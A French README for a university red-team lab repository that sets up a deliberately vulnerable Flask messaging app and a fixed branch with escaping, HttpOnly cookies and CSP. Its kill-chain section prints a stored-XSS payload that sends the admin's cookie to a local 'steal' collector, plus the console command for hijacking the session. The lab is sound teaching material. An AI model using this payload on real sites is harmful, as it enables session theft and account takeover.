# 🛡️ Lab_cyber — XSS Stocké & Vol de Cookie de Session

**EMINES – Université Mohammed VI Polytechnique · Benguerir · 2026**  
**Cours Cybersécurité – Projet P01 – Red Team**

> ⚠️ **Usage pédagogique uniquement.** Ce laboratoire contient une application volontairement vulnérable dans un environnement strictement local et contrôlé. Voir [`DISCLAIMER.md`](./DISCLAIMER.md).

---

## 🎯 Objectif

Démontrer comment une vulnérabilité **XSS Stocké** dans une messagerie interne peut être exploitée pour **voler le cookie de session d'un administrateur** et usurper son identité — sans jamais connaître son mot de passe.

---

## ⚔️ Deux branches, deux états

Ce dépôt est organisé autour de **deux branches** qui représentent deux états opposés de l'application :

### 🔴 Branche `main` — Application vulnérable (Attaque)

La plateforme universitaire **UniPortail** dans son état **non sécurisé**. Elle contient une faille XSS Stockée intentionnelle dans la messagerie interne : les messages sont stockés en base de données sans encodage et restitués sans filtrage dans la page HTML, ce qui permet l'injection de code JavaScript malveillant.

Un attaquant disposant d'un simple compte étudiant peut envoyer un message piégé à l'administrateur. Dès que l'admin ouvre ce message, son cookie de session est exfiltré silencieusement vers le serveur attaquant (`attacker-server/`).

```bash
git checkout main
```

### 🟢 Branche `fixed-xss` — Application corrigée (Contre-attaque)

La même application, cette fois **sécurisée par une défense en profondeur** :

| Correction | Détail |
|---|---|
| **Sanitisation des entrées** | `html.escape()` encode les caractères dangereux avant stockage |
| **Encodage des sorties** | Suppression du filtre `\| safe` dans les templates Jinja2 |
| **Cookie `HttpOnly`** | JavaScript ne peut plus lire `document.cookie` — le vol devient impossible |
| **Cookie `Secure` + `SameSite`** | Protection complémentaire contre les attaques réseau et CSRF |
| **Content Security Policy (CSP)** | Seuls les scripts du même domaine sont autorisés à s'exécuter |

```bash
git checkout fixed-xss
```

---

## 🏗️ Architecture

```
Lab_cyber/
├── app/                    ← Plateforme universitaire UniPortail (Python/Flask)
│   ├── app.py              ← Serveur principal + routes
│   ├── templates/          ← Templates Jinja2
│   └── ...
├── attacker-server/        ← Serveur attaquant C2
│   └── cookie_stealer.py   ← Collecteur de cookies (port 8000)
├── db/
│   └── init.sql            ← Schéma + données de test
├── docker-compose.yml
└── DISCLAIMER.md
```

---

## 👥 Comptes de test

| Rôle | Email | Mot de passe |
|---|---|---|
| Administrateur | admin@uni.ma | Admin@2026 |
| Étudiant 1 | kalami@uni.ma | Etud@2026 |
| Étudiant 2 | fchraibi@uni.ma | Etud@2026 |

---

## 🚀 Installation & Lancement

### Prérequis

- [Docker Desktop](https://www.docker.com/products/docker-desktop/) installé et **démarré**
- Ports libres : `8080` (application), `8000` (serveur attaquant), `3306` (MySQL)

### Lancer l'application vulnérable (branche `main`)

```bash
# 1. Cloner le dépôt
git clone https://github.com/BilalJaouad/Lab_cyber.git
cd Lab_cyber

# 2. S'assurer d'être sur la branche principale
git checkout main

# 3. Construire et démarrer les conteneurs
docker compose up --build -d

# 4. Attendre ~15 secondes, puis ouvrir :
#    Application  →  http://localhost:8080
#    Attaquant C2 →  http://localhost:8000
```

### Lancer l'application corrigée (branche `fixed-xss`)

```bash
git checkout fixed-xss
docker compose up --build -d
```

### Arrêt

```bash
docker compose down       # Arrêter les conteneurs
docker compose down -v    # Arrêter + supprimer les données
```

---

## 🔬 La Kill Chain (branche `main`)

```
(1) Injection → (2) Stockage → (3) Exécution → (4) Exfiltration → (5) Usurpation
```

**Étape 1 — Préparation**
Lancer le serveur attaquant depuis `attacker-server/` :
```bash
python cookie_stealer.py
# [*] Serveur attaquant en écoute sur le port 8000...
```

**Étape 2 — Injection**
Se connecter en tant qu'étudiant (`kalami@uni.ma`) et envoyer ce message à l'Admin :
```html
<script>
  new Image().src = 'http://127.0.0.1:8000/steal?c=' + document.cookie;
</script>
```

**Étape 3 — Exécution**
L'administrateur ouvre sa messagerie → le script s'exécute silencieusement dans son navigateur.

**Étape 4 — Exfiltration**
Le terminal du serveur attaquant affiche :
```
[!] COOKIE VOLÉ
[+] Valeur : APP_SID=eyJhbGciOiJIUzI1NiJ9.xyz
[+] IP source : 192.168.1.42
```

**Étape 5 — Usurpation**
Dans le navigateur de l'attaquant : `F12` → Console → injecter le cookie :
```javascript
document.cookie = "APP_SID=eyJhbGciOiJIUzI1NiJ9.xyz; path=/";
```
Rafraîchir → **l'attaquant est connecté en tant qu'admin** 🔓

---

## 🔒 Pourquoi `HttpOnly` bloque l'attaque (branche `fixed-xss`)

| | Sans `HttpOnly` ❌ | Avec `HttpOnly` ✅ |
|---|---|---|
| `document.cookie` | Retourne `APP_SID=abc123` | Retourne `""` (vide) |
| Exfiltration | Possible | **Impossible** |
| Usurpation | Réussie | **Bloquée** |

```python
# Branche fixed-xss — Configuration sécurisée
app.config['SESSION_COOKIE_HTTPONLY'] = True  # Bloque document.cookie
app.config['SESSION_COOKIE_SECURE']   = True  # HTTPS uniquement
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # Protection anti-CSRF
```

---

## 📦 Livrables

- [x] Code source versionné (2 branches)
- [x] README d'installation (< 5 min)
- [x] `docker-compose.yml` avec 3 services
- [x] Base de données initialisée avec données fictives
- [x] Serveur collecteur de cookies `cookie_stealer.py` (C2)
- [x] `DISCLAIMER.md`
- [x] Rapport PDF
- [x] Présentation
